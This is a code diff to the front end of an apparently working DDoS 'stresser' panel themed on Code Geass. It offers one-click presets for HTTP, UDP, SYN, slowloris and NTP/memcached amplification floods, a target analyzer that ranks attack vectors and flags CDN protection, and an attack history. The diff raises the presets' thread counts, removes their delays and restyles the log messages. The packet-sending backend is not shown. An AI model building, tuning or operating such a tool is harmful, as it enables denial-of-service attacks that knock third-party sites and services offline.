@@ -34,13 +34,13 @@ const methodInfo = (m: string) => {
 
 /* ── Presets ── */
 const PRESETS: Preset[] = [
-  { label: "Quick Strike",   method: "http-flood",     packetSize: 64,   duration: 30,  delay: 50,  threads: 8,   icon: "⚡" },
-  { label: "Heavy Assault",  method: "udp-flood",      packetSize: 1024, duration: 120, delay: 10,  threads: 64,  icon: "💥" },
-  { label: "Stealth Mode",   method: "slowloris",      packetSize: 32,   duration: 300, delay: 500, threads: 4,   icon: "🥷" },
-  { label: "SYN Hammer",     method: "syn-flood",      packetSize: 40,   duration: 90,  delay: 5,   threads: 128, icon: "🔨" },
-  { label: "NTP Nuclear",    method: "ntp-amp",        packetSize: 46,   duration: 60,  delay: 5,   threads: 256, icon: "☢️" },
-  { label: "MEMCACHED NUKE", method: "mem-amp",        packetSize: 15,   duration: 30,  delay: 1,   threads: 512, icon: "💀" },
-  { label: "Geass Override", method: "geass-override", packetSize: 512,  duration: 120, delay: 0,   threads: 512, icon: "👁" },
+  { label: "Quick Strike",   method: "http-flood",     packetSize: 64,   duration: 60,  delay: 0,   threads: 80,  icon: "⚡" },
+  { label: "Heavy Assault",  method: "udp-flood",      packetSize: 1024, duration: 120, delay: 0,   threads: 300, icon: "💥" },
+  { label: "Stealth Mode",   method: "slowloris",      packetSize: 32,   duration: 300, delay: 500, threads: 8,   icon: "🥷" },
+  { label: "SYN Hammer",     method: "syn-flood",      packetSize: 40,   duration: 90,  delay: 0,   threads: 400, icon: "🔨" },
+  { label: "NTP Nuclear",    method: "ntp-amp",        packetSize: 46,   duration: 60,  delay: 0,   threads: 600, icon: "☢️" },
+  { label: "MEMCACHED NUKE", method: "mem-amp",        packetSize: 15,   duration: 60,  delay: 0,   threads: 900, icon: "💀" },
+  { label: "Geass Override", method: "geass-override", packetSize: 512,  duration: 180, delay: 0,   threads: 1000, icon: "👁" },
 ];
 
 /* ── Log counter ── */
@@ -122,23 +122,23 @@ const powerLevel = (threads: number, m?: string) => {
 };
 
 const LOG_MSGS_HTTP = [
-  (t: string, n: string) => `♟ ${n} real HTTP requests fired → ${t}`,
-  (t: string) => `♟ Flood workers maintaining ${t} under load [LIVE]`,
-  (_t: string, n: string) => `♟ ${n} req/s reaching target — HTTP workers active`,
-  (t: string) => `♟ Connection pressure on ${t} — hold the line`,
-  (_t: string, n: string) => `♟ ${n} HTTP/1.1 requests dispatched this second`,
+  (t: string, n: string) => `👁 ${n} real HTTP requests fired → ${t}`,
+  (t: string) => `👁 Flood workers maintaining ${t} under load [LIVE]`,
+  (_t: string, n: string) => `👁 ${n} req/s reaching target — HTTP workers active`,
+  (t: string) => `👁 Connection pressure on ${t} — hold the line`,
+  (_t: string, n: string) => `👁 ${n} HTTP/1.1 requests dispatched this second`,
 ];
 const LOG_MSGS_TCP = [
-  (t: string, n: string) => `♟ ${n} TCP SYN packets sent → ${t}:80 [REAL]`,
-  (t: string) => `♟ Socket pool flooding ${t} — connection queue growing`,
-  (_t: string, n: string) => `♟ ${n} TCP connections/sec — RST storm active`,
-  (t: string) => `♟ ${t} connection table under siege`,
+  (t: string, n: string) => `👁 ${n} TCP SYN packets sent → ${t}:80 [REAL]`,
+  (t: string) => `👁 Socket pool flooding ${t} — connection queue growing`,
+  (_t: string, n: string) => `👁 ${n} TCP connections/sec — RST storm active`,
+  (t: string) => `👁 ${t} connection table under siege`,
 ];
 const LOG_MSGS_SIM = [
-  (_t: string, n: string) => `♟ ${n} amplified packets computed [UDP VECTOR]`,
-  () => `♟ Amplification multiplier saturating target bandwidth`,
-  (_t: string, n: string) => `♟ ${n} pkt/s — UDP flood vector active`,
-  () => `♟ Raw socket layer — amplification active`,
+  (_t: string, n: string) => `👁 ${n} amplified packets computed [UDP VECTOR]`,
+  () => `👁 Amplification multiplier saturating target bandwidth`,
+  (_t: string, n: string) => `👁 ${n} pkt/s — UDP flood vector active`,
+  () => `👁 Raw socket layer — amplification active`,
 ];
 const LOG_MSGS_GEASS = [
   (t: string, n: string) => `👁 Geass Override: ${n} vectors annihilating ${t} [HTTP+TCP]`,
@@ -348,7 +348,7 @@ function Panel() {
         setProgress(100); setPps(0); setBps(0);
         setLastAtkPkts(currentPacketsRef.current);
         setLastAtkBytes(currentBytesRef.current);
-        addLog(`♟ Operation complete — ${currentPacketsRef.current.toLocaleString()} requests sent in ${durationRef.current}s`, "success");
+        addLog(`👁 Operation complete — ${currentPacketsRef.current.toLocaleString()} requests sent in ${durationRef.current}s`, "success");
         if (soundRef.current) playTone("stop");
         if ("vibrate" in navigator) navigator.vibrate([100, 50, 100]);
         refetchStats(); refetchHistory();
@@ -388,7 +388,7 @@ function Panel() {
         } else if (prev === "offline" && now === "online") {
           addLog(`⚠ Target recovered: HTTP ${data.status} ${data.statusText} (${data.responseTime}ms)`, "warn");
         } else if (prev === "unknown") {
-          addLog(`♟ Target baseline: ${now === "online" ? "ONLINE" : "OFFLINE"} — HTTP ${data.status || "N/A"} (${data.responseTime}ms)`, "info");
+          addLog(`👁 Target baseline: ${now === "online" ? "ONLINE" : "OFFLINE"} — HTTP ${data.status || "N/A"} (${data.responseTime}ms)`, "info");
         }
       } catch { /* network error — skip check */ }
     };
@@ -417,11 +417,11 @@ function Panel() {
     if (!target.trim()) { addLog("✕ No target — enter a URL or IP address.", "error"); return; }
 
     if (isRunning) {
-      addLog("♟ Revoking Geass — halting strike...", "warn");
+      addLog("👁 Revoking Geass — halting strike...", "warn");
       if (currentAttackId !== null) {
         try {
           await stopAttack.mutateAsync({ id: currentAttackId });
-          addLog("♟ Strike halted by royal decree.", "success");
+          addLog("👁 Strike halted by royal decree.", "success");
           if (soundRef.current) playTone("stop");
           if ("vibrate" in navigator) navigator.vibrate([100, 50, 100]);
         } catch { addLog("✕ Failed to stop attack.", "error"); }
@@ -440,7 +440,7 @@ function Panel() {
       addLog(`👁 ABSOLUTE GEASS COMMAND — target: ${target}`, "info");
       addLog(`  Dual-vector: HTTP flood (250w) + TCP flood (300w) | Threads: ${threads} | Duration: ${duration}s`, "info");
     } else {
-      addLog(`♟ Geass granted — target: ${target}`, "info");
+      addLog(`👁 Geass granted — target: ${target}`, "info");
       addLog(`  Vector: ${method.toUpperCase()} | Threads: ${threads} | Duration: ${duration}s`, "info");
     }
     if (soundRef.current) playTone("start");
@@ -461,7 +461,7 @@ function Panel() {
       setProgress(0); setPps(0); setBps(0); setPeakPps(0); setPeakBps(0); setPpsHistory([]);
       setLastAtkPkts(0); setLastAtkBytes(0);
       const mi = methodInfo(method);
-      addLog(`♟ Strike launched [ID #${result.id}] — vector: ${method.toUpperCase()} [${mi.badge}]`, "success");
+      addLog(`👁 Strike launched [ID #${result.id}] — vector: ${method.toUpperCase()} [${mi.badge}]`, "success");
       saveFavorite(target.trim()); refetchHistory(); refetchStats();
     } catch { addLog("✕ Launch failed — check backend connection.", "error"); }
   }
@@ -482,7 +482,7 @@ function Panel() {
   function applyPreset(p: Preset) {
     setMethod(p.method); setPacketSize(p.packetSize);
     setDuration(p.duration); setDelay(p.delay); setThreads(p.threads);
-    addLog(`♟ Preset: ${p.label} — ${p.method.toUpperCase()}, ${p.threads} threads, ${p.duration}s`, "info");
+    addLog(`👁 Preset: ${p.label} — ${p.method.toUpperCase()}, ${p.threads} threads, ${p.duration}s`, "info");
     if (soundRef.current) playTone("tick");
   }
   function handleClearLogs() { setLogs([mkLog("Terminal cleared.", "info")]); }
@@ -493,13 +493,13 @@ function Panel() {
     const a = document.createElement("a"); a.href = url;
     a.download = `lelouch-log-${Date.now()}.txt`; a.click();
     URL.revokeObjectURL(url);
-    addLog("♟ Logs exported.", "success");
+    addLog("👁 Logs exported.", "success");
   }
   async function handleAnalyze() {
     const urlToAnalyze = target.trim();
     if (!urlToAnalyze) { addLog("✕ Enter a target URL or IP to analyze.", "error"); return; }
     setIsAnalyzing(true); setAnalyzeResult(null); setShowAnalyze(true);
-    addLog(`♟ Intelligence gathering on ${urlToAnalyze}...`, "info");
+    addLog(`👁 Intelligence gathering on ${urlToAnalyze}...`, "info");
     if (soundRef.current) playTone("tick");
     try {
       const res = await fetch(`${BASE}/api/analyze`, {
@@ -509,8 +509,8 @@ function Panel() {
       const data: AnalyzeResult = await res.json();
       setAnalyzeResult(data);
       const best = data.recommendations[0];
-      addLog(`♟ Analysis complete: ${data.recommendations.length} vectors ranked`, "success");
-      if (best) addLog(`♟ Best method: ${best.name} [Tier ${best.tier}] — score ${best.score}/100`, "success");
+      addLog(`👁 Analysis complete: ${data.recommendations.length} vectors ranked`, "success");
+      if (best) addLog(`👁 Best method: ${best.name} [Tier ${best.tier}] — score ${best.score}/100`, "success");
       if (data.isCDN) addLog(`⚠ CDN detected (${data.cdnProvider}) — layer 7 attacks partially mitigated`, "warn");
       if (soundRef.current) playTone("check");
     } catch { addLog("✕ Analysis failed — check backend connection.", "error"); }
@@ -532,7 +532,7 @@ function Panel() {
       if (soundRef.current) playTone("check");
       addLog(
         data.up
-          ? `♟ ${urlToCheck} → HTTP ${data.status} ${data.statusText} (${data.responseTime}ms)`
+          ? `👁 ${urlToCheck} → HTTP ${data.status} ${data.statusText} (${data.responseTime}ms)`
           : `✕ ${urlToCheck} → OFFLINE — ${data.statusText} (${data.responseTime}ms)`,
         data.up ? "success" : "error"
       );
@@ -644,7 +644,7 @@ function Panel() {
                 onClick={handleLaunch}
                 disabled={createAttack.isPending}
               >
-                <span className="lb-btn-glyph">♟</span>
+                <img src={GEASS_SYMBOL} className="lb-btn-glyph-img" alt=""/>
                 {isRunning ? "ABORT GEASS" : "COMMAND GEASS"}
               </button>
               <button className="lb-btn-icon lb-btn-gold" title="Clear terminal" onClick={handleClearLogs}>⚡</button>
@@ -667,7 +667,7 @@ function Panel() {
             {showAnalyze && (
               <div className="lb-analyzer">
                 <div className="lb-analyzer-header">
-                  <span className="lb-analyzer-title">♟ INTELLIGENCE ANALYSIS</span>
+                  <span className="lb-analyzer-title">👁 INTELLIGENCE ANALYSIS</span>
                   <button className="lb-analyzer-close" onClick={() => setShowAnalyze(false)}>✕</button>
                 </div>
 
@@ -734,7 +734,7 @@ function Panel() {
                               setMethod(rec.method);
                               setThreads(rec.suggestedThreads);
                               setDuration(rec.suggestedDuration);
-                              addLog(`♟ Applied: ${rec.name} — ${rec.suggestedThreads} threads, ${rec.suggestedDuration}s [Tier ${rec.tier}]`, "success");
+                              addLog(`👁 Applied: ${rec.name} — ${rec.suggestedThreads} threads, ${rec.suggestedDuration}s [Tier ${rec.tier}]`, "success");
                               if (soundRef.current) playTone("tick");
                               setShowAnalyze(false);
                             }}
@@ -871,7 +871,7 @@ function Panel() {
 
             {/* Site checker */}
             <section className="lb-checker">
-              <h3 className="lb-section-title">♟ Site Status Checker</h3>
+              <h3 className="lb-section-title">👁 Site Status Checker</h3>
               <div className="lb-checker-row">
                 <input
                   className="lb-input lb-checker-input"
@@ -904,7 +904,7 @@ function Panel() {
             <section className="lb-history">
               <button className="lb-history-toggle"
                 onClick={() => { setShowHistory(v => !v); if (!showHistory) refetchHistory(); }}>
-                ♟ Attack History ({allAttacks.length}) {showHistory ? "▲" : "▼"}
+                👁 Attack History ({allAttacks.length}) {showHistory ? "▲" : "▼"}
               </button>
               {showHistory && (
                 <div className="lb-history-list">
@@ -940,7 +940,7 @@ function Panel() {
         onClick={handleLaunch}
         aria-label={isRunning ? "Abort Geass" : "Command Geass"}
       >
-        <span className="lb-fab-glyph">♟</span>
+        <img src={GEASS_SYMBOL} className="lb-fab-glyph-img" alt=""/>
         <span className="lb-fab-label">{isRunning ? "ABORT" : "GEASS"}</span>
       </button>
     </div>
